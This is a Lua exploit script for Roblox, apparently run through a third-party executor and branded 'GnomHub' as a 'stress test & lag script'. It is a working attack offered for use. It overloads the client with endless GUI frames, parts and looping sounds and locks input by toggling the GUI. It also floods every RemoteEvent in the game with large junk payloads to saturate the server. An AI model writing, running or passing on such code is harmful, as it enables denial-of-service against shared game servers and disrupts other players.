--[[
    GnomHub - Advanced Stress Test & Lag Script
    Optimized for Delta Executor
    Environment: Deep Space Zero-Point
]]

if getgenv().GnomHubRunning then
    return
else
    getgenv().GnomHubRunning = true
end

local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local Camera = workspace.CurrentCamera

-- 1. Optimization & Safety Check
local function SafeWait()
    task.wait(0.01)
end

-- 2. GUI/Renderer Freeze
local function CreateGuiLag()
    local sg = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui"))
    sg.Name = "GnomHub_Overload"
    task.spawn(function()
        while true do
            for i = 1, 100 do
                local frame = Instance.new("Frame", sg)
                frame.Size = UDim2.new(1, 0, 1, 0)
                frame.BackgroundColor3 = Color3.new(math.random(), math.random(), math.random())
                frame.BackgroundTransparency = 0.5
            end
            task.wait()
        end
    end)
end

-- 3. Extreme Instance Spam (Neon/Glass Overdraw)
local function StartInstanceSpam()
    task.spawn(function()
        while true do
            task.spawn(function()
                for i = 1, 50 do
                    local p = Instance.new("Part")
                    p.Size = Vector3.new(10, 10, 10)
                    p.Material = i % 2 == 0 and Enum.Material.Glass or Enum.Material.Neon
                    p.CFrame = Camera.CFrame * CFrame.new(math.random(-5, 5), math.random(-5, 5), -2)
                    p.CanCollide = false
                    p.Anchored = true
                    p.Parent = workspace
                    task.delay(0.5, function() p:Destroy() end)
                end
            end)
            RunService.RenderStepped:Wait()
        end
    end)
end

-- 4. RemoteEvent Flood (Network Saturation)
local function FloodNetwork()
    local junkData = {}
    for i = 1, 100 do
        junkData[string.rep("GnomHub", 500)] = string.rep("X", 500)
    end
    
    task.spawn(function()
        while true do
            for _, v in pairs(game:GetDescendants()) do
                if v:IsA("RemoteEvent") then
                    v:FireServer(junkData)
                end
            end
            task.wait(0.1)
        end
    end)
end

-- 5. Sound Overload
local function CrashAudio()
    task.spawn(function()
        while true do
            local sound = Instance.new("Sound", workspace)
            sound.SoundId = "rbxassetid://12222242" -- Тяжелый звук
            sound.Volume = 10
            sound.Looped = true
            sound:Play()
            task.wait(0.1)
        end
    end)
end

-- 6. Input Lock (Heartbeat Modal)
RunService.Heartbeat:Connect(function()
    local gui = LocalPlayer.PlayerGui:FindFirstChildWhichIsA("ScreenGui")
    if gui then
        gui.Enabled = not gui.Enabled
    end
end)

-- Execute Modules
print("GnomHub: Initializing Zero-Point Protocol...")
CreateGuiLag()
StartInstanceSpam()
FloodNetwork()
CrashAudio()
